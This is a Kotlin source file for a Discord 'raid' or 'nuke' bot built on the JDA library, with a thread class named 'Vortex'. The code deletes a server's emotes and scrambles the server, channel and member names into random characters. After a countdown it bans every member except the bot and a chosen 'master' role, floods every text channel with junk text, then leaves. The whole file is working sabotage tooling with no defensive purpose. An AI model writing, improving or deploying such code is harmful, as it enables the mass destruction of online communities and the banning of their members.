package kali

import net.dv8tion.jda.api.entities.*
import net.dv8tion.jda.api.requests.*
import net.dv8tion.jda.api.Permission

class Vortex(val guild: Guild, val log: MessageChannel, val masterRole: String) : Thread()
{

  val chaos = "पतचतंमनजदगहैाीोे्िुपतचतंमनजदगहैाीज"
  val extra = "      !!!!!!"
  val gName = guild.getName();

  init {
    println("vortex for $gName created")
  }

  override fun run()
  {
    guild.retrieveMembers().get()
    Thread.sleep(2000)
    emoji()
    names()
    banEm()
    Thread.sleep(2000)
    shout()
    Thread.sleep(2000)
    leave()
  }

  fun banEm()
  {
    for (i in 30 downTo 1) {
      println("$gName => ban in $i")
      log.sendMessage("$i   " + chaotize(128, true)).queue()
      Thread.sleep(1000)
    }
    println("$gName => banning")
    log.sendMessage("!!!!!" + chaotize(128, true)).complete()

    for (member in guild.getMembers()) {
      if (isMaster(member))
        continue
      try {
        member.ban(0, chaotize(128, true)).complete()
      } catch (e: Exception) {
      }
    }
  }

  fun emoji()
  {
    println("$gName => deleting emotes")
    for (emote in guild.getEmotes()) {
      emote.delete().queue()
    }
  }

  fun shout()
  {
    println("$gName => shouting")
    for (channel in guild.getTextChannels()) {
      channel.sendMessage(chaotize).queue()
    }
  }

  fun names()
  {
    println("$gName => chaotizing names")

    guild.getManager().setName(chaotize(guild.getName())).queue()

    for (member in guild.getMembers()) {
      if (isMaster(member))
        continue
      try {
        member.modifyNickname(chaotize(member.getEffectiveName())).queue()
      } catch (e: Exception) {
      }
    }

    for (channel in guild.getChannels()) {
      val manager = channel.getManager()
      manager.setName(chaotize(channel.getName())).queue()
    }

  }

  fun leave()
  {
    println("$gName => leaving")
    try {
      guild.leave().complete()
    } catch (e: Exception) {
    }
  }

  fun isMaster(member: Member) : Boolean
  {
    if (member.getRoles().any{ it.getName() == masterRole})
      return true
    else if (member == guild.getSelfMember())
      return true
    else
      return false
  }

  fun chaotize(length: Int, shout: Boolean) : String
  {
    var buf = ""
    var tmp = chaos
    if (shout)
      tmp += extra
    for (i in 1..length)
      buf += tmp[ (0 until tmp.length).random() ]
    return buf
  }

  fun chaotize(str: String) = chaotize(str.length, false)
  val chaotize: String
      get() = chaotize(2000, true)


}
